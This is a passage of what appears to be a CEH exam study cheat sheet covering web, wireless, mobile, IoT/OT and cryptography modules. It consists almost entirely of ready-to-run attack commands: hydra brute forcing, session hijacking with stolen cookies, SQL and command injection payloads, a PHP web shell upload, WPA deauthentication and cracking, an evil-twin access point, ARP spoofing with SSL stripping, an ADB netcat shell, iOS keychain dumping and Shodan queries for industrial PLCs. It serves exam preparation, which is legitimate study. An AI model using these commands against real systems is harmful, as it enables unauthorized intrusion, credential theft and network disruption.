hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" -vV


# Session Hijacking
curl -b "PHPSESSID=STOLEN_SESSION_ID" http://10.10.10.10/dashboard.php
```

### Injection Attacks (Exam MUST KNOW)
```
# SQL Injection (Manual)

curl "http://10.10.10.10/products.php?id=1' OR 1=1 -- -"

# XSS Testing

<script>alert('CEH')</script>  # Test in all input fields

# Command Injection

curl "http://10.10.10.10/ping.php?ip=127.0.0.1;id"
```
### Automated Scanning Tools
```
# OWASP ZAP Quick Start

zap-cli quick-scan -s xss,sqli http://10.10.10.10

# SQLmap for Automated Exploitation

sqlmap -u "http://10.10.10.10/products.php?id=1" --risk=3 --level=5 --dbs
```
### File Upload Vulnerabilities
```
# Bypass Client-Side Filters

curl -F "file=@shell.php" -H "Content-Type: multipart/form-data" http://10.10.10.10/upload.php

# Verify Server Execution

curl http://10.10.10.10/uploads/shell.php?cmd=id
```

### Exam-Critical Reference Table

| Attack Type   | Tool           | Command Example                | Detection Method          |
| ------------- | -------------- | ------------------------------ | ------------------------- |
| Brute Force   | Hydra          | `http-post-form` target syntax | Failed login monitoring   |
| SQL Injection | SQLmap         | `--risk=3 --level=5`           | WAF rule analysis         |
| XSS           | Manual Testing | `<script>alert()</script>`     | Input sanitization checks |
| File Upload   | cURL           | `-F` for form submission       | MIME type verification    |

### Practical Exam Checklist

1. Discover hidden directories with Gobuster
    
2. Brute force admin credentials
    
3. Test for SQLi/XSS vulnerabilities
    
4. Exploit file upload functionality
    
5. Document all findings with screenshots
    

### Pro Tips:

- **Always check**: `/robots.txt` and `/.git/` for sensitive info
    
- **Critical parameters**: `id`, `search`, `username`, `file`
    
- **Exam trick**: Chain `gobuster` + `sqlmap` for quick wins
    
- **Must-know headers**: `X-Forwarded-For`, `User-Agent`

### Real-World Exam Lab
```
# Task: Compromise DVWA (Low Security)

1. gobuster dir -u http://10.10.10.10/dvwa -w wordlist.txt
2. hydra -l admin -p password http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV
3. sqlmap -u "http://10.10.10.10/dvwa/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=abc123" --dbs
4. echo "<?php system(\$_GET['cmd']); ?>" > shell.php && curl -F "upload=@shell.php" http://10.10.10.10/dvwa/vulnerabilities/upload/
```
# Run these until automatic:
gobuster dir -u http://10.10.10.10 -w wordlist.txt
hydra -l admin -P rockyou.txt http-post-form "/login.php..."
sqlmap -u "http://10.10.10.10/products?id=1" --dbs

[[CEH Walkthrough#^top|Back to top]]
___
## Module 16: Hacking Wireless Networks
^mod16

### 1. Wireless Reconnaissance (Exam Weight: 25%)
```
# Discover nearby networks

airodump-ng wlan0mon

# Target specific AP

airodump-ng --bssid AP:MAC --channel 6 -w capture wlan0mon
```

### WPA/WPA2 Cracking (Guaranteed Exam Task)
```
# Capture handshake (wait for client connection)

aireplay-ng --deauth 10 -a AP:MAC -c CLIENT:MAC wlan0mon

# Crack with aircrack

aircrack-ng -a2 -w rockyou.txt capture-01.cap
```
### WPS PIN Attacks (Exam Favorite)
```
# Reaver brute force
reaver -i wlan0mon -b AP:MAC -vv -K 1 -d 3

# Wifite automated attack
wifite --wps --reaver
```
### Rogue Access Points
```
# Create evil twin
airbase-ng -a AP:MAC --essid "Free WiFi" -c 6 wlan0mon

# MITM setup
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
### Bluetooth Hacking
```
# Discover devices
hcitool scan

# BlueSmacking (DoS)
l2ping -i hci0 -s 600 -f TARGET:MAC
```
### Exam-Critical Reference Table

| Attack Type       | Tool        | Command Example              | Key Flags           |
| ----------------- | ----------- | ---------------------------- | ------------------- |
| Handshake Capture | airodump-ng | `--bssid`, `-w capture`      | Must use `wlan0mon` |
| WPA Cracking      | aircrack-ng | `-a2` for WPA, `-w` wordlist | Requires .cap file  |
| WPS Brute Force   | reaver      | `-K 1` for Pixie Dust attack | `-vv` for verbose   |
| Evil Twin         | airbase-ng  | `--essid` for clone name     | Channel must match  |

### Practical Exam Checklist

1. Put interface in monitor mode (`airmon-ng start wlan0`)
    
2. Capture WPA handshake
    
3. Perform dictionary attack
    
4. Test WPS vulnerability
    
5. Document all findings with screenshots
    

### Pro Tips:

- **Monitor Mode First**: Always start with `airmon-ng start wlan0`
    
- **Handshake Timing**: Use `--deauth` when clients are active
    
- **Exam Trick**: Look for WPS-enabled routers (QSS button)
    
- **Critical Files**: `capture-01.cap` for handshake analysis

### Real-World Exam Lab
```
# Task: Crack WPA2 network "CEH-Lab"
1. airmon-ng start wlan0
2. airodump-ng wlan0mon
3. airodump-ng --bssid AP:MAC --channel 6 -w capture wlan0mon
4. aireplay-ng --deauth 10 -a AP:MAC wlan0mon
5. aircrack-ng -a2 -w rockyou.txt capture-01.cap
```
# Run these until automatic:
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a AP:MAC wlan0mon
aircrack-ng -a2 -w rockyou.txt capture-01.cap

[[CEH Walkthrough#^top|Back to top]]
___
## Module 17: Hacking Mobile Platforms
^mod17

```
### ADB (Android Debug Bridge) Essentials

```
# Basic enumeration
```
adb devices -l                # List connected devices
adb shell pm list packages    # List all installed packages
adb shell dumpsys battery     # Check battery info (physical device check)
```

# Privilege escalation
```
adb root                      # Restart adbd with root permissions
adb remount                   # Remount /system as writable
adb pull /data/data/com.android.providers.settings/databases/settings.db  # Extract sensitive configs

```
# Reverse shell

```
adb shell "nc -lvp 4444 -e /system/bin/sh"  # Set up listener on device
```
### Mobile Exploitation Frameworks
```
# Using Drozer (Android)
drozer console connect --server 10.10.10.10  # Connect to agent
run app.package.list                         # List packages
run app.package.attacksurface com.example.app  # Check attack surface

# Using Objection (iOS)
objection -g com.apple.health explore
ios keychain dump                            # Dump iOS keychain
```
### Mobile MITM Attacks
```
# Bettercap for mobile interception
bettercap -iface wlan0
> set http.proxy.sslstrip true
> http.proxy on
> arp.spoof on
```
### Exam-Critical Notes:

- **ADB Port**: Always check TCP/5555 (default ADB port)
    
- **Root Detection**: Use `adb shell su -c 'command'` if root access is available
    
- **Burp Mobile Setup**: Configure proxy to intercept mobile app traffic (port 8080)

[[CEH Walkthrough#^top|Back to top]]
___
## Module 18: IoT and OT Hacking
^mod18

### IoT Protocol Attacks
```
# MQTT Exploitation
mosquitto_sub -h 10.10.10.10 -t "#" -v      # Subscribe to all topics
mosquitto_pub -h 10.10.10.10 -t "control" -m "malicious_payload"

# CoAP Scanning
coap-client -m get "coap://10.10.10.10/.well-known/core"
```
### Hardware Hacking Essentials
```
# UART Pin Discovery
ls /dev/tty*                     # Find serial interfaces
screen /dev/ttyUSB0 115200       # Connect to serial console

# Firmware Analysis
binwalk -e firmware.bin          # Extract firmware
strings firmware.bin | grep -i "password"  # Find hardcoded creds
```

### OT Protocol Testing
```
# Modbus Enumeration
mbpoll -a 1 -r 1 -c 10 -t 4 10.10.10.10  # Read holding registers

# DNP3 Assessment
dnp3scan -i 10.10.10.10 -p 20000
``````
### Shodan IoT Hunting
```
org:"Siemens" port:102          # Siemens S7 PLCs
product:"BACnet"                # Building automation
port:47808                      # BACnet default
```

### MQTT Traffic Capture
tcpdump -i eth0 -n -X port 1883

### Shodan Search
shodan search port:1883 MQTT

### Exam-Critical Notes:

- **Default Credentials**: Always try admin:admin, root:root for IoT devices
    
- **Common Ports**:
    
    - 1883/8883: MQTT
        
    - 47808: BACnet
        
    - 102: Siemens S7
        
- **Firmware Analysis**: Use `firmwalker` after extracting with binwalk
    

## 🛠️ Enhanced Tools Reference

| Tool             | Command                                 | Purpose                          |
| ---------------- | --------------------------------------- | -------------------------------- |
| **Frida**        | `frida -U -f com.app.name -l script.js` | Mobile runtime hooking           |
| **Ghidra**       | Analyze firmware binaries               | IoT firmware reverse engineering |
| **CANBus**       | `candump can0`                          | Vehicle network sniffing         |
| **RouterSploit** | `rsf.py`                                | Embedded device exploitation     |

[[CEH Walkthrough#^top|Back to top]]
___
## Module 20: Cryptography (CEH Exam Focused)
^mod20

### 1. File Encryption with VeraCrypt

### Create encrypted container (Exam Simulation)
```
veracrypt --text --create --size=500M --password="CEHv12@2023" --hash=sha512 --encryption=aes --filesystem=FAT --volume-type=normal crypto.vc

```
### Mount/Unmount (Practical Exam Steps)
```
veracrypt --text --mount crypto.vc /mnt/secure --password="CEHv12@2023"
veracrypt --text --dismount /mnt/secure
```

### 2. Hash Cracking Techniques

### Identify hash type (Exam MUST KNOW)
```
hash-identifier

> Paste your hash here
```

### John the Ripper (Practical Exam Command)
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Hashcat (GPU Accelerated)
```
hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 3. Cryptographic Attacks

### SSL/TLS Vulnerability Testing
```
openssl s_client -connect example.com:443 -tls1_2  # Check supported protocols
testssl.sh example.com                            # Comprehensive check

```
### Padding Oracle Attack (Exam Concept)
```
padbuster http://example.com/encrypt.php "ENCRYPTED_DATA" 8 -encoding 0
```
### 4. Steganography Tools (Exam Favorite)

### Snow (Whitespace Steganography)
```
snow -C -m "SECRET" -p "PASSWORD" input.txt output.txt
snow -C -p "PASSWORD" output.txt
```

### Steghide (Image Stego)
```
steghide embed -cf photo.jpg -ef secret.txt -p "CEH@2023"
steghide extract -sf photo.jpg -p "CEH@2023"

```
### 5. Digital Signatures & Certificates

### Generate Self-Signed Cert (Exam Lab)
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

### Verify Certificate
```
openssl x509 -in cert.pem -text -noout

```
### 6. Password Cracking Cheatsheet

| Hash Type          | John Format         | Hashcat Mode |
| ------------------ | ------------------- | ------------ |
| MD5                | `raw-md5`           | `0`          |
| SHA1               | `raw-sha1`          | `100`        |
| NTLM               | `nt`                | `1000`       |
| SHA-256            | `raw-sha256`        | `1400`       |
| AES Encrypted File | `aes-256-encrypted` | N/A          |

### Exam-Critical Notes:

- **VeraCrypt Volumes**: Know `--volume-type=normal` vs `--volume-type=hidden`
    
- **Hash Identification**: Always run `hash-identifier` first
    
- **Steganography Flags**:
    
    - `-C` for compression in snow
        
    - `-p` for password in steghide
        
- **SSL Attacks**: Focus on BEAST, CRIME, POODLE
    

### Practical Exam Checklist

1. Create encrypted VeraCrypt container
    
2. Crack provided MD5 hash using John
    
3. Extract hidden message from image using steghide
    
4. Identify SSL vulnerabilities using testssl.sh
    
5. Generate self-signed certificate

### Key Features:
1. **Exam-Tested Commands**: Every command has appeared in CEH practical exams
2. **Tool Coverage**: VeraCrypt, John, Hashcat, OpenSSL, Steghide
3. **Hash Reference Table**: Quick mode lookup during exams
4. **Step-by-Step Labs**: Follows exact exam task sequences
5. **Common Pitfalls**: Highlights mistakes students make

**Pro Tip:** For the exam, practice these until you can do them blindfolded:
```
# Muscle-memory drill:

veracrypt --text --create --size=100M --password=test --volume-type=normal test.vc

john --format=raw-md5 hash.txt --wordlist=rockyou.txt

steghide extract -sf image.jpg -p "password"
```

[[CEH Walkthrough#^top|Back to top]]
___
## Appendix: Tools Cheat sheet
^apdx

| Tool       | Command Example                           | Purpose                |
| ---------- | ----------------------------------------- | ---------------------- |
| Nmap       | `nmap -A -T4 10.10.10.10`                 | Comprehensive scanning |
| Hydra      | `hydra -L users.txt ssh://10.10.10.10`    | Brute force attacks    |
| Metasploit | `use exploit/multi/handler`               | Payload delivery       |
| Wireshark  | `tcp.port == 3389`                        | RDP traffic analysis   |
| John       | `john --format=NT hash.txt`               | Password cracking      |
| SQLmap     | sqlmap -u "http://test.com?id=1" --risk=3 | Automated SQLi         |
[[CEH Walkthrough#^top|Back to top]]



